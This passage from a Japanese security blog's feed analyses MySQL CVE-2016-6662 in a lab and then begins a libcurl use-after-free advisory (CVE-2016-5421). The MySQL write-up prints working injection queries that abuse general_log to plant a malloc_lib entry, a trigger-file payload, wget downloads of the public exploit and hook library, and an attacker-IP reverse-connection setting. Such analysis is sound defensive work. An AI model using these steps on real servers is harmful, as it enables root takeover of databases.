&lt;p&gt;MySQLの設定ファイルはmysqld_safeの実行時にサポートされているすべての場所から読み込まれます。サポートされている場所はMySQLのVerisonによって異なり、&lt;a href=&quot;http://dev.mysql.com/doc/refman/5.6/ja/option-files.html&quot;&gt;ドキュメント&lt;/a&gt;により説明されています。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Unix、Linux、および OS X では、MySQL プログラムは起動オプションを次のファイルから指定された順 (トップの項目が最初に使用されます) で読み取ります。
 * /etc/my.cnf : グローバルオプション
 * /etc/mysql/my.cnf : グローバルオプション
 * SYSCONFDIR/my.cnf : グローバルオプション
 * $MYSQL_HOME/my.cnf : サーバー固有のオプション
 * defaults-extra-file :    --defaults-extra-file=path によって指定されるファイル (ある場合)
 * ~/.my.cnf : ユーザー固有のオプション
 * ~/.mylogin.cnf : ログインパスオプション
MYSQL_HOME はサーバー固有の my.cnf ファイルが存在するディレクトリへのパスを含む環境変数です。MYSQL_HOME がセットされていない状態で mysqld_safe プログラムを使ってサーバーを起動すると、mysqld_safe は次のように MYSQL_HOME をセットしようとします。
BASEDIR および DATADIR が、それぞれ MySQL ベースディレクトリとデータディレクトリのパス名を示すようにします。
DATADIR には my.cnf ファイルが存在し、BASEDIR には存在しない場合、mysqld_safe は MYSQL_HOME を DATADIR にセットします。
そうでない場合は、MYSQL_HOME がセットされておらず、my.cnf ファイルが DATADIR に存在しない場合、mysqld_safe は BASEDIR に MYSQL_HOME をセットします。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;MySQLの設定ファイルはmysqlユーザにより所有されていなければならないという誤解はかなり多く見受けられます。この誤解はBLOGやチュートリアル、chefやansibleの様なプロビジョニングツールのレシピなどに見られます。MySQLの設定ファイルはmysqlユーザ以外の所有権であったとしても適切に動作します。 有効なパスにmysqlユーザが読み書き可能な設定ファイルが存在する場合、攻撃者は以下のようにして設定ファイルに悪意のある設定をインジェクションすることができます。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;mysqlユーザが読み書きできるmy.cnf&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@CVE-2016-6662:~# ls -l /etc/my.cnf
-rw------- 1 mysql mysql 70  9月 13 17:31 /etc/my.cnf
root@CVE-2016-6662:~# cat /etc/my.cnf
[mysqld]

key_buffer              = 16M
max_allowed_packet      = 16M
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;my.cnfに設定を注入&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; set global general_log_file = '/etc/my.cnf';
Query OK, 0 rows affected (0.00 sec)
mysql&amp;gt; set global general_log = on;
Query OK, 0 rows affected (0.00 sec)
mysql&amp;gt; select '
    '&amp;gt;
    '&amp;gt; ; injected config entry
    '&amp;gt;
    '&amp;gt; [mysqld]
    '&amp;gt; malloc_lib=/tmp/mysql_exploit_lib.so
    '&amp;gt;
    '&amp;gt; [separator]
    '&amp;gt;
    '&amp;gt; ';
+-----------------------------------------------------------------------------------------+
| ; injected config entry

[mysqld]
malloc_lib=/tmp/mysql_exploit_lib.so

[separator]

   |
+-----------------------------------------------------------------------------------------+
|

; injected config entry

[mysqld]
malloc_lib=/tmp/mysql_exploit_lib.so

[separator]

 |
+-----------------------------------------------------------------------------------------+
1 row in set (0.00 sec)

mysql&amp;gt; set global general_log = off;
Query OK, 0 rows affected (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;注入後の/etc/my.cnf&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@CVE-2016-6662:~# ls -l /etc/my.cnf
-rw------- 1 mysql mysql 422  9月 13 17:33 /etc/my.cnf
root@CVE-2016-6662:~# cat /etc/my.cnf
[mysqld]

key_buffer              = 16M
max_allowed_packet      = 16M
/usr/sbin/mysqld, Version: 5.5.50-0+deb8u1 ((Debian)). started with:
Tcp port: 3306  Unix socket: /var/run/mysqld/mysqld.sock
Time                 Id Command    Argument
160913 17:33:16    37 Query     select '

; injected config entry

[mysqld]
malloc_lib=/tmp/mysql_exploit_lib.so

[separator]

'
160913 17:33:42    37 Query     set global general_log = off
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;この設定ファイルには有効ではない記述が含まれているため、mysqlの起動に失敗します。
しかし重要なのは以下の設定がmy.cnfに含まれていることです。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[mysqld]
malloc_lib=/tmp/mysql_exploit_lib.so
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;mysqldデーモンの起動前に、mysqld_safeが正しく共有ライブラリパスを読み込んでLD_PRELOAD環境変数に追加します。 プリロードされたライブラリは、その後のlibcのfopen()の呼び出しをフックし、mysqldデーモンによって処理され設定前に起動します。&lt;/p&gt;

&lt;h2 id=&quot;mysql&quot;&gt;MySQLデータディレクトリ(デフォルトで書き込み可能になっている)に新たな設定ファイルの作成することができる。&lt;/h2&gt;

&lt;p&gt;mysqld_safeにはmysql data direcotoryに配置されたmy.cnfを読み込みパスに追加するためのコードが存在します。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   418  # Try where the binary installs put it
   419  if test -d $MY_BASEDIR_VERSION/data/mysql
   420  then
   421    DATADIR=$MY_BASEDIR_VERSION/data
   422    if test -z &quot;$defaults&quot; -a -r &quot;$DATADIR/my.cnf&quot;
   423    then
   424      defaults=&quot;--defaults-extra-file=$DATADIR/my.cnf&quot;
   425    fi
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;データディレクトリの/var/lib/mysqlはmysqlユーザによって明らかに書き込みが可能です。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@CVE-2016-6662:~# ls -ld /var/lib/mysql
drwx------ 5 mysql mysql 4096  9月 13 17:48 /var/lib/mysql
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;したがって、攻撃者がMySQLのFILEパーミッションを持つ場合、以下のパスに設定ファイルを作成することにより、悪意のある設定を読み込ませることができます。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/var/lib/mysql/my.cnf 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;OUTFILEを利用した方法では、作成されるファイルのパーミッションは前述の通り、誰でも読み書き可能なmysql所有のファイルになるため設定ファイルとして読み込まれることはありません。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; SELECT 'malicious config entry' INTO OUTFILE '/var/lib/mysql/my.cnf';
Query OK, 1 row affected (0.00 sec)

root@CVE-2016-6662:~# ls -l /var/lib/mysql/my.cnf
-rw-rw-rw- 1 mysql mysql 23  9月 13 18:57 /var/lib/mysql/my.cnf

root@CVE-2016-6662:/var/log/mysql# tail -f /var/log/mysql/error.log | grep -i world
Warning: World-writable config file '/var/lib/mysql/my.cnf' is ignored
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;しかし、攻撃者はloggin SQL statementを利用することにより、この制限を迂回することができます。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; set global general_log_file = '/var/lib/mysql/my.cnf';
Query OK, 0 rows affected (0.00 sec)

mysql&amp;gt; set global general_log = on;
Query OK, 0 rows affected (0.00 sec)

mysql&amp;gt;  select '
    '&amp;gt;
    '&amp;gt; ; injected config entry
    '&amp;gt;
    '&amp;gt; [mysqld]
    '&amp;gt;  malloc_lib=/var/lib/mysql/mysql_hookandroot_lib.so
    '&amp;gt;
    '&amp;gt;  [separator]
    '&amp;gt; ';
+--------------------------------------------------------------------------------------------------------+
| ; injected config entry

[mysqld]
 malloc_lib=/var/lib/mysql/mysql_hookandroot_lib.so

 [separator]
   |
+--------------------------------------------------------------------------------------------------------+
|

; injected config entry

[mysqld]
 malloc_lib=/var/lib/mysql/mysql_hookandroot_lib.so

 [separator]
 |
+--------------------------------------------------------------------------------------------------------+
1 row in set (0.00 sec)

mysql&amp;gt; set global general_log = off;
Query OK, 0 rows affected (0.01 sec)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;このオペレーションで作成されるmy.cnfはotherのrwが欠如しているため、mysqlはこのファイルをロードしようとします。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@CVE-2016-6662:~# ls -l /var/lib/mysql/my.cnf
-rw-rw---- 1 mysql mysql 367  9月 13 19:02 /var/lib/mysql/my.cnf
root@CVE-2016-6662:~# cat /var/lib/mysql/my.cnf
/usr/sbin/mysqld, Version: 5.5.50-0+deb8u1 ((Debian)). started with:
Tcp port: 3306  Unix socket: /var/run/mysqld/mysqld.sock
Time                 Id Command    Argument
160913 19:02:44    37 Query     select '

; injected config entry

[mysqld]
 malloc_lib=/var/lib/mysql/mysql_hookandroot_lib.so

 [separator]
'
160913 19:02:53    37 Query     set global general_log = off
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;しかしmy.cnfは有効なセクションヘッダーから開始されなければ、適切にロードされることはありません。さらなるテストでは、このセキュリティを回避することが可能であることを示します。 しかし、現在アドバイザリにはこれらの情報は含まれません。 CVE-2016-6663のCVEIDを割り当てられているアドバイザリでは、現在開示を保留していますが、FILE権限なしで任意のコンテンツを持つ/var/lib/mysql/my.cnfを作成します。&lt;/p&gt;

&lt;h2 id=&quot;selectfilelogging-function&quot;&gt;攻撃者はSELECT/FILE権限を持っている場合、logging functionへのアクセスを取得し、設定ファイルを作成することができる。&lt;/h2&gt;

&lt;p&gt;攻撃者は以下のようなクエリを実行することにより、SELECTとFILEのみのパーミッションしか保有していなくても、logging
functionを実行することができます。(通常これにはsuper権限が必要です)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SELECT &quot;CREATE DEFINER=`root`@`localhost` TRIGGER appendToConf
AFTER INSERT
   ON `active_table` FOR EACH ROW
BEGIN
   DECLARE void varchar(550);
   set global general_log_file='/var/lib/mysql/my.cnf';
   set global general_log = on;
   select \&quot;
[mysqld]
malloc_lib='/var/lib/mysql/mysql_hookandroot_lib.so'

\&quot; INTO void;   
   set global general_log = off;
END;
&quot; INTO DUMPFILE '/var/lib/mysql/wp_db/active_table.TRG'; 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;アドバイザリのexploitから必要なコードを抜き出して、&lt;a href=&quot;https://gist.github.com/KosukeShimofuji/68bb706aabfa2efc0dfafbfc3b007fde&quot;&gt;access_logging_function.py&lt;/a&gt;を作成し、発生する現象というものを観察してみます。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;MySQLの事前準備&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kosuke@scapegoat ~ $ mysql -uroot -pmysql
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 44
Server version: 5.5.50-0+deb8u1 (Debian)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql&amp;gt; CREATE DATABASE pocdb;
Query OK, 1 row affected (0.00 sec)

mysql&amp;gt; GRANT FILE ON *.* TO 'attacker'@'%' IDENTIFIED BY 'p0cpass!';
Query OK, 0 rows affected (0.00 sec)

mysql&amp;gt; GRANT SELECT, INSERT, CREATE ON `pocdb`.* TO 'attacker'@'%';
Query OK, 0 rows affected (0.00 sec)

mysql&amp;gt; select User,File_priv,Super_priv,Trigger_priv from mysql.user where user='attacker';
+----------+-----------+------------+--------------+
| User     | File_priv | Super_priv | Trigger_priv |
+----------+-----------+------------+--------------+
| attacker | Y         | N          | N            |
+----------+-----------+------------+--------------+
1 row in set (0.00 sec)

mysql&amp;gt; exit
Bye
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;実行&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python ./access_logging_function.py -dbuser attacker -dbpass 'p0cpass!' -dbhost scapegoat.test -dbname pocdb -mycnf /var/lib/mysql/my.cnf
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016/09/14/access_logging_function.gif&quot; alt=&quot;access_logging_function&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ネットの情報では本攻撃にはSuper_privが必要という記述をちらほらみますがご覧の通り、特筆すべき点としてこの攻撃にSuper_privは必要ありません。またTrigger_privも必要ありません。 また、この攻撃にはすでにmysqlで書き込み可能なmy.cnfが必要という記述も見かけますが、その性質は本質的な箇所ではないと思います。 Exploitでmysql権限で書き込めるmy.cnfを必要としているのはうまくセクションをこの手法では書けないからだと推測しますが、Dawid Golunskiさんは前述の通り、公表はしていないがうまくセクションヘッダを書く手法を知っていると記述しています。&lt;/p&gt;

&lt;h2 id=&quot;proof-of-concept&quot;&gt;Proof of Concept&lt;/h2&gt;

&lt;p&gt;脆弱なMySQLサーバを持つホストと攻撃者が使用するホストを用意する&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;scapegoat.test 攻撃対象ホスト&lt;/li&gt;
  &lt;li&gt;attacker.test  攻撃者のホスト&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;section-4&quot;&gt;事前準備&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;MySQLの設定&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kosuke@scapegoat ~ $ mysql -uroot -pmysql
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 44
Server version: 5.5.50-0+deb8u1 (Debian)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql&amp;gt; CREATE DATABASE pocdb;
Query OK, 1 row affected (0.00 sec)

mysql&amp;gt; GRANT FILE ON *.* TO 'attacker'@'%' IDENTIFIED BY 'p0cpass!';
Query OK, 0 rows affected (0.00 sec)

mysql&amp;gt; GRANT SELECT, INSERT, CREATE ON `pocdb`.* TO 'attacker'@'%';
Query OK, 0 rows affected (0.00 sec)

mysql&amp;gt; select User,File_priv,Super_priv from mysql.user where user='attacker';
+----------+-----------+------------+
| User     | File_priv | Super_priv |
+----------+-----------+------------+
| attacker | Y         | N          |
+----------+-----------+------------+
1 row in set (0.00 sec)

mysql&amp;gt; exit
Bye
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;MySQLの設定ファイルのパーミッションを脆弱にする&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kosuke@scapegoat ~ $ ls -l /etc/mysql/my.cnf
-rw-r--r-- 1 root root 3533  7月 21 14:04 /etc/mysql/my.cnf
kosuke@scapegoat ~ $ sudo chown mysql:mysql /etc/mysql/my.cnf
kosuke@scapegoat ~ $ sudo chmod 644 /etc/mysql/my.cnf
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;攻撃用のexploitと悪意のあるshareモジュールをダウンロードする&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kosuke@attacker ~ $ wget http://legalhackers.com/exploits/0ldSQL_MySQL_RCE_exploit.py
kosuke@attacker ~ $ wget http://legalhackers.com/exploits/mysql_hookandroot_lib.c
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;mysql_hookandroot_lib.cの攻撃者IPを書き換える&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#define ATTACKERS_IP &quot;192.168.10.103&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;pythonの設定&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kosuke@attacker ~ $ pyenv install 2.7.11
kosuke@attacker ~ $ pyenv virtualenv 2.7.11 exploit
kosuke@attacker ~ $ git clone https://github.com/mysql/mysql-connector-python.git
kosuke@attacker ~ $ cd mysql-connector-python
kosuke@attacker ~ $ python ./setup.py build
kosuke@attacker ~ $ python ./setup.py install
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;section-5&quot;&gt;攻撃の実施&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python ./0ldSQL_MySQL_RCE_exploit.py -dbuser attacker -dbpass 'p0cpass!' -dbhost scapegoat.test -dbname pocdb -mycnf /etc/mysql/my.cnf
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016/09/14/CVE-2016-6662.gif&quot; alt=&quot;CVE-2016-6662&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;section-6&quot;&gt;まとめ&lt;/h2&gt;

&lt;p&gt;複数の問題を利用してroot権限の奪取を可能にしている。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;2003年に修正されたはずのother permissionを付与しないファイルの新規作成&lt;/li&gt;
  &lt;li&gt;2003年に修正されたはずのファイル内容の変更&lt;/li&gt;
  &lt;li&gt;FILE権限のみでSuper権限とTrigger権限が必要な操作の実行&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;さらに未公表のCVE-2016-6663にはFILE権限すら必要なく、mysqlの設定ファイルを任意に書き換えることができること示唆している。&lt;/p&gt;

&lt;h2 id=&quot;section-7&quot;&gt;情報源&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.kb.cert.org/vuls/byid?query=CVE-2016-6662&amp;amp;searchview=&quot;&gt;CERT&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://security-tracker.debian.org/tracker/CVE-2016-6662&quot;&gt;Debian&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/search?q=&amp;quot;CVE-2016-6662&amp;quot;&quot;&gt;Github&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://lwn.net/Search/DoSearch?words=CVE-2016-6662&quot;&gt;LWN&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-6662&quot;&gt;NVD&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://packetstormsecurity.com/search/?q=CVE-2016-6662&quot;&gt;PacketStorm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://access.redhat.com/security/cve/CVE-2016-6662&quot;&gt;Redhat&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://people.canonical.com/~ubuntu-security/cve/CVE-2016-6662.html&quot;&gt;Ubuntu&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://marc.info/?s=CVE-2016-6662&amp;amp;l=bugtraq&quot;&gt;bugtraq&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/search/?action=search&amp;amp;cve=2016-6662&quot;&gt;exploitdb&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://marc.info/?s=CVE-2016-6662&amp;amp;l=full-disclosure&quot;&gt;fulldisc&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.rapid7.com/db/search?q=CVE-2016-6662&quot;&gt;metasploit&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://marc.info/?s=CVE-2016-6662&amp;amp;l=oss-security&quot;&gt;oss-sec&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;section-8&quot;&gt;参考文献&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.txt&lt;/li&gt;
  &lt;li&gt;https://www.reddit.com/r/netsec/comments/52dgxh/mysql_remote_root_code_execution_privilege/&lt;/li&gt;
  &lt;li&gt;http://www.itmedia.co.jp/news/articles/1609/13/news055.html&lt;/li&gt;
  &lt;li&gt;http://qiita.com/yoku0825/items/dcdffae9e95658d86502&lt;/li&gt;
  &lt;li&gt;https://twitter.com/search?q=CVE-2016-6662&amp;amp;src=typd&lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Tue, 13 Sep 2016 15:00:00 +0900</pubDate>
        <link>https://kosukeshimofuji.jp/2016/09/13/CVE-2016-6662/</link>
        <guid isPermaLink="true">https://kosukeshimofuji.jp/2016/09/13/CVE-2016-6662/</guid>
        
        
        <category>vulnerability</category>
        
      </item>
    
      <item>
        <title>CVE-2016-5421 Use-after-free vulnerability in libcurl before 7.50.1</title>
        <description>&lt;h2 id=&quot;section&quot;&gt;概要&lt;/h2&gt;

&lt;p&gt;libcurlの7.50.1より前のversionにはuse after freeの脆弱性があるため、攻撃者は使用される接続を制御することができるなど、不特定の影響を受ける脆弱性が存在します。&lt;/p&gt;

&lt;h2 id=&quot;cvss-v3&quot;&gt;CVSS v3&lt;/h2&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;CVSS v3 Base Score&lt;/td&gt;
      &lt;td&gt;9.8 Critical&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Vector&lt;/td&gt;
      &lt;td&gt;CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Impact Score&lt;/td&gt;
      &lt;td&gt;5.9&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Exploitability Score&lt;/td&gt;
      &lt;td&gt;3.9&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Attack Vector (AV)&lt;/td&gt;
      &lt;td&gt;Network&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Attack Complexity (AC)&lt;/td&gt;
      &lt;td&gt;Low&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Privileges Required (PR)&lt;/td&gt;
      &lt;td&gt;None&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;User Interaction (UI)&lt;/td&gt;
      &lt;td&gt;None&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Scope (S)&lt;/td&gt;
      &lt;td&gt;Unchanged&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Confidentiality (C)&lt;/td&gt;
      &lt;td&gt;High&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Integrity (I)&lt;/td&gt;
      &lt;td&gt;High&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Availability (A)&lt;/td&gt;
      &lt;td&gt;High&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;section-1&quot;&gt;解決策、緩和策情報&lt;/h2&gt;

&lt;p&gt;各ベンダが提供するパッチを適用してください。&lt;/p&gt;

&lt;h2 id=&quot;section-2&quot;&gt;影響を受けるソフトウェアとバージョン&lt;/h2&gt;

&lt;p&gt;libcurl 7.32.0から7.50.0のバージョンは本脆弱性の影響を受けます。
7.50.1以上のversionからこの脆弱性は修正されています。
この脆弱性は各言語のbindingからも顕在化する可能性があります。
またcurlコマンドラインツールは影響がありません。&lt;/p&gt;

&lt;h2 id=&quot;section-3&quot;&gt;技術的な詳細&lt;/h2&gt;

&lt;p&gt;libcurlは_url_easy_init()関数により生成される* CURL型のオブジェクトを利用して単一の接続状態を保持します。
マルチインターフェイスを使用する場合、アプリケーションはマルチハンドルに1つまたはそれ以上のハンドルを追加することにより並行した転送を駆動させることができます。
問題はマルチハンドルに追加された接続構造体のポインタは残すことができるということです 。そのハンドルは適切に閉じられている場合、これは顕著な害をもたらすようには見えません。
しかしながらcurl_easy_peformは盲目的に今解放されたメモリをさす接続構造体のポインタを利用します。
この問題を利用すれば固定されたURLまたはホストに対して固定されたオプションのセットで接続を強制させることができる。&lt;/p&gt;

&lt;h2 id=&quot;section-4&quot;&gt;不正なアプリケーションのための疑似コード&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;easy = curl_easy_init();
curl_easy_setopt(easy, CURLOPT_URL, &quot;http://example.com/&quot;);
// --- start of code to confuse libcurl ---
multi = curl_multi_init();
curl_multi_add_handle(multi, easy);
curl_multi_perform(multi, &amp;amp;still_running);
curl_multi_cleanup(multi);
// --- attack code
allocate_fake_connection_struct()
fill_in_fake_connection_struct()
// ---- end of confusion code
// now this is called, it will not use example.com at all even if the
// option above asks for it...
curl_easy_perform(easy);
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;section-5&quot;&gt;困難性&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://curl.haxx.se/CVE-2016-5421.patch&quot;&gt;パッチ&lt;/a&gt;を見ると、curl_multi_cleanup時にconn-&amp;gt;data-&amp;gt;easy_connをNULLにする修正。つまり、マルチハンドルに追加されたポインタをNULLにする修正が入っている。
この脆弱性を発現させるためには、curl_multi_add_handleを利用しており、その後、curl_easy_performを利用しているアプリケーションにおいて、curl_multi_cleanupからcurl_easy_performが呼ばれる間にメモリを汚染する必要がある。&lt;/p&gt;

&lt;h2 id=&quot;section-6&quot;&gt;情報源&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.kb.cert.org/vuls/byid?query=CVE-2016-5421&amp;amp;searchview=&quot;&gt;CERT&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://security-tracker.debian.org/tracker/CVE-2016-5421&quot;&gt;Debian&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/search?q=&amp;quot;CVE-2016-5421&amp;quot;&quot;&gt;Github&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://lwn.net/Search/DoSearch?words=CVE-2016-5421&quot;&gt;LWN&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-5421&quot;&gt;NVD&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://packetstormsecurity.com/search/?q=CVE-2016-5421&quot;&gt;PacketStorm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://access.redhat.com/security/cve/CVE-2016-5421&quot;&gt;Redhat&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://people.canonical.com/~ubuntu-security/cve/CVE-2016-5421.html&quot;&gt;Ubuntu&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://marc.info/?s=CVE-2016-5421&amp;amp;l=bugtraq&quot;&gt;bugtraq&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/search/?action=search&amp;amp;cve=2016-5421&quot;&gt;exploitdb&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://marc.info/?s=CVE-2016-5421&amp;amp;l=full-disclosure&quot;&gt;fulldisc&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.rapid7.com/db/search?q=CVE-2016-5421&quot;&gt;metasploit&lt;/a&gt;&lt;/li&gt;
